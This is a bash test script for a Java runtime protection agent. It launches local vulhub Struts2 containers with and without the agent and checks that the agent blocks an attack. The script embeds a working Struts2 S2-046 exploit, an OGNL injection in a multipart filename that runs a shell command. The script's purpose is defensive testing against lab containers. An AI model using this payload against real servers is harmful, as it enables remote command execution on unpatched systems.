#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_STRUTS2_S2046_IMAGE:-vulhub/struts2:2.3.30}"
baseline_name="${OHMYRASP_VULHUB_STRUTS2_S2046_BASELINE_NAME:-ohmyrasp-vulhub-struts2-s2046-baseline}"
protected_name="${OHMYRASP_VULHUB_STRUTS2_S2046_PROTECTED_NAME:-ohmyrasp-vulhub-struts2-s2046-protected}"
baseline_port="${OHMYRASP_VULHUB_STRUTS2_S2046_BASELINE_PORT:-18532}"
protected_port="${OHMYRASP_VULHUB_STRUTS2_S2046_PROTECTED_PORT:-18533}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-struts2-s2-046-java8-baseline"
protected_dir="logs/vulhub-struts2-s2-046-java8-protected"
protected_log="${protected_dir}/events.jsonl"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:8080" \
  "$image" >/dev/null

docker run -d --name "$protected_name" -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" || true)"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose Struts2 root at ${port}" >&2
  exit 1
}

send_attack() {
  local port="$1"
  local output="$2"
  python3 - "$port" "$output" <<'PY'
import socket
import sys

port = int(sys.argv[1])
output = sys.argv[2]
boundary = b"----WebKitFormBoundaryXd004BVJN9pBYBL2"
ognl = (
    b"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    b"(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    b"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    b"(#ognlUtil.getExcludedPackageNames().clear())."
    b"(#ognlUtil.getExcludedClasses().clear())."
    b"(#context.setMemberAccess(#dm))))."
    b"(#cmd='id')."
    b"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    b"(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
    b"(#p=new java.lang.ProcessBuilder(#cmds).redirectErrorStream(true).start())."
    b"(#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())."
    b"(@org.apache.commons.io.IOUtils@copy(#p.getInputStream(),#ros))."
    b"(#ros.flush())}"
)
body = (
    b"--" + boundary + b"\r\n"
    b"Content-Disposition: form-data; name=\"upload\"; filename=\"" + ognl + b"\x00b\"\r\n"
    b"Content-Type: text/plain\r\n\r\n"
    b"foo\r\n"
    b"--" + boundary + b"--\r\n"
)
request = (
    b"POST / HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(port).encode() + b"\r\n"
    b"User-Agent: ohmyrasp-s2-046\r\n"
    b"Accept: */*\r\n"
    b"Connection: close\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
    + body
)
data = b""
with socket.create_connection(("127.0.0.1", port), timeout=10) as conn:
    conn.sendall(request)
    conn.shutdown(socket.SHUT_WR)
    while True:
        chunk = conn.recv(65536)
        if not chunk:
            break
        data += chunk
with open(output, "wb") as handle:
    handle.write(data)
PY
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in Struts2 S2-046 protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "Struts2 S2-046 protected startup/readiness produced a detection before the exploit request" >&2
  exit 1
fi

send_attack "$baseline_port" "${baseline_dir}/attack.response"
if ! grep -q 'uid=' "${baseline_dir}/attack.response"; then
  sed -n '1,200p' "${baseline_dir}/attack.response" >&2 || true
  echo "baseline Struts2 S2-046 filename OGNL did not return id output" >&2
  exit 1
fi

send_attack "$protected_port" "${protected_dir}/attack.response"
if grep -q 'uid=' "${protected_dir}/attack.response"; then
  sed -n '1,200p' "${protected_dir}/attack.response" >&2 || true
  echo "protected Struts2 S2-046 filename OGNL returned command output despite Java8 RASP" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java8_command_execution_exploit_primitive".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java8_command_execution_exploit_primitive block event for Struts2 S2-046" >&2
  exit 1
fi

echo "vulhub Struts2 S2-046 Java8 acceptance passed"
